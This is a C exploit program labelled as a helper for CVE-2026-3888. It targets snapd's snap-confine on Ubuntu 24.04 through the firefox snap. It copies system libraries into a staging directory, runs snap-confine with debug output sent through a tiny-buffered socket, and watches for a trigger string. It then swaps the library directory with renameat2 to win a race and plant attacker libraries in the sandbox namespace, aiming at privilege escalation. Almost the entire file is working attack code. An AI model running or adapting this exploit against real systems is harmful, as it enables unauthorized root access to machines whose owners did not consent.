#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>

#define SNAP_CONFINE "/usr/lib/snapd/snap-confine"
#define EXCHANGE_SRC ".snap/usr/lib/x86_64-linux-gnu.exchange"
#define EXCHANGE_DST ".snap/usr/lib/x86_64-linux-gnu"
#define REAL_LIBDIR  "/snap/core22/current/usr/lib/x86_64-linux-gnu"
#define TRIGGER      "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""

static int copy_file(const char *src, const char *dst) {
    int fds = open(src, O_RDONLY);
    if (fds < 0) return -1;
    int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fdd < 0) { close(fds); return -1; }
    char buf[65536];
    ssize_t n;
    while ((n = read(fds, buf, sizeof(buf))) > 0)
        write(fdd, buf, n);
    close(fds);
    close(fdd);
    return 0;
}

static int setup_snap_and_exchange(const char *payload_so) {
    mkdir(".snap", 0755);
    mkdir(".snap/usr", 0755);
    mkdir(".snap/usr/lib", 0755);
    mkdir(".snap/usr/local", 0755);
    mkdir(".snap/snap", 0755);
    mkdir(".snap/snap/firefox", 0755);

    DIR *d = opendir("/snap/firefox");
    if (d) {
        struct dirent *ent;
        while ((ent = readdir(d)) != NULL) {
            if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {
                char p[512];
                snprintf(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);
                mkdir(p, 0755);
                snprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);
                mkdir(p, 0755);
            }
        }
        closedir(d);
    }

    mkdir(EXCHANGE_SRC, 0755);

    d = opendir(REAL_LIBDIR);
    if (!d) { perror("opendir real libdir"); return -1; }

    int count = 0;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.' &&
            (ent->d_name[1] == '\0' ||
             (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
            continue;

        char src[4096], dst[4096];
        snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent->d_name);
        snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent->d_name);

        struct stat st;
        if (lstat(src, &st) < 0) continue;

        if (S_ISDIR(st.st_mode)) {
            mkdir(dst, 0755);
        } else if (S_ISLNK(st.st_mode)) {
            char link[4096];
            ssize_t len = readlink(src, link, sizeof(link) - 1);
            if (len > 0) { link[len] = '\0'; symlink(link, dst); }
        } else {
            copy_file(src, dst);
        }
        count++;
    }
    closedir(d);

    printf("[*] Exchange dir ready: %d entries in %s\n", count, EXCHANGE_SRC);
    return 0;
}

static int create_stderr_socket(int *read_fd, int *write_fd) {
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        perror("socketpair"); return -1;
    }
    int bufsize = 1;
    setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    *read_fd = sv[0];
    *write_fd = sv[1];
    return 0;
}

static int run_and_race(void) {
    int read_fd, write_fd;
    if (create_stderr_socket(&read_fd, &write_fd) < 0) return -1;

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return -1; }

    if (pid == 0) {
        close(read_fd);
        dup2(write_fd, STDERR_FILENO);
        close(write_fd);
        clearenv();
        setenv("SNAPD_DEBUG", "1", 1);
        setenv("SNAP_INSTANCE_NAME", "firefox", 1);
        execl(SNAP_CONFINE, "snap-confine",
              "--base", "core22",
              "snap.firefox.hook.configure",
              "/bin/sh", "-c",
              "echo $$ > /tmp/race_pid.txt; "
              "stat -c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
              "> /tmp/race_perms.txt 2>&1; "
              "sleep 99994",
              NULL);
        _exit(1);
    }

    close(write_fd);

    char ringbuf[4096];
    int ringpos = 0;
    memset(ringbuf, 0, sizeof(ringbuf));
    int tlen = strlen(TRIGGER);
    char byte;
    ssize_t n;
    int swapped = 0;

    printf("[*] Reading snap-confine output (PID %d)...\n", pid);

    while ((n = read(read_fd, &byte, 1)) > 0) {
        write(STDOUT_FILENO, &byte, 1);

        ringbuf[ringpos % sizeof(ringbuf)] = byte;
        ringpos++;

        if (!swapped && ringpos >= tlen) {
            char check[512];
            for (int i = 0; i < tlen && i < (int)sizeof(check) - 1; i++)
                check[i] = ringbuf[(ringpos - tlen + i) % sizeof(ringbuf)];
            check[tlen] = '\0';

            if (strstr(check, TRIGGER)) {
                printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");

                #ifndef RENAME_EXCHANGE
                #define RENAME_EXCHANGE (1 << 1)
                #endif
                if (syscall(SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
                            AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0) {
                    /* atomic swap succeeded */
                } else {
                    rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
                    rename(EXCHANGE_SRC, EXCHANGE_DST);
                }

                swapped = 1;
                printf("[+] SWAP DONE! Race won.\n");
                printf("[*] Do NOT close this terminal.\n");
            }
        }
    }

    close(read_fd);
    int status;
    waitpid(pid, &status, 0);

    if (swapped)
        printf("[+] Race won! Our libraries are in the namespace.\n");
    else
        printf("[-] Trigger not detected. Race lost.\n");

    return swapped ? 0 : -1;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <payload.so>\n", argv[0]);
        return 1;
    }
    printf("[*] CVE-2026-3888 -- firefox 24.04 helper\n");
    printf("[*] CWD: "); fflush(stdout); system("pwd");
    printf("[*] Setting up .snap and .exchange directory...\n");
    if (setup_snap_and_exchange(argv[1]) < 0) return 1;
    printf("[*] Starting race against snap-confine...\n");
    if (run_and_race() < 0) return 1;
    printf("[+] Done. Re-enter sandbox to exploit.\n");
    return 0;
}
